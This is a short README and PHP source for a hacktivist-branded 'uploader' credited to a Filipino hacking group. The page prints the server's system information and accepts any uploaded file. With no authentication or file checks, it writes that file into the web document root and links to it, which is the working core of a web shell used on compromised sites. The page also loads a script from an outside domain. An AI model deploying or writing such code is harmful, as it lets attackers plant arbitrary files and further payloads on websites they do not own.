# FCH-UPLOADER
Simple Uploader
//Recode By Ph.T3X -Mr.w4x

//Greetz : - B4L1SON6 - MR.J4Y - Bisaya Cyber Army  - Philippines Cyber Mafia & All Member of FILIPINO CYBER HACKTIVIST

<html><title> mr.w4x Uploader </title>

<script src="http://e-mete.com/js/kdsnow.js"></script> <style> body{ background-image: url(); background-repeat: no-repeat; background-attachment: fixed; background-position: top; background-color:#000000; position: relative; background-size:100% 100vh; } .logo { width: 300px; height: 300px; margin: 0 auto; margin-top: 50px; -webkit-filter: drop-shadow(0px 0px 7px #0080FF); filter: drop-shadow(0px 0px 7px #0080FF); } .logo:hover{ width: 300px; height: 300px; -webkit-filter: drop-shadow(0px 0px 10px #0080FF); opacity:0.4; filter:alpha(opacity=40); transition: opacity .2s ease-out; -moz-transition: opacity .2s ease-out; -webkit-transition: opacity .2s ease-out; -o-transition: opacity .2s ease-out; }</style> 

<table width="100%" height="100%"><td align=center>

<br><table width="30%" height="30%"><td align=center><img src="https://i.top4top.io/p_2485jbis20.png" width="400" height="400"</img><br>

<font color="clay">

<?php

echo " MR.W4X - FILIPINO CYBER HACKTIVIST <br>";

echo "<b>".php_uname()."</b><br>";

echo "<form method='post' enctype='multipart/form-data'>

	  <input type='file' name='just_file'>

	  <input type='submit' name='upload' value='upload' <3'>

	  </form>";

$root = $_SERVER['DOCUMENT_ROOT'];

$files = $_FILES['just_file']['name'];

$dest = $root.'/'.$files;

if(isset($_POST['upload'])) {

	if(is_writable($root)) {

		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {

			$web = "http://".$_SERVER['HTTP_HOST']."/";

			echo "sukses upload -> <a href='$web$files' target='_blank'><b><u>$web/$files?W00t</u></b></a>";

		} else {

			echo "fail upload di document root .";

		}

	} else {

		if(@copy($_FILES['just_file']['tmp_name'], $files)) {

			echo " upload <b>$files</b>in this folder";

		} else {

			echo "fail upload ";

		}

	}

}

?>

</font></table></td></html>
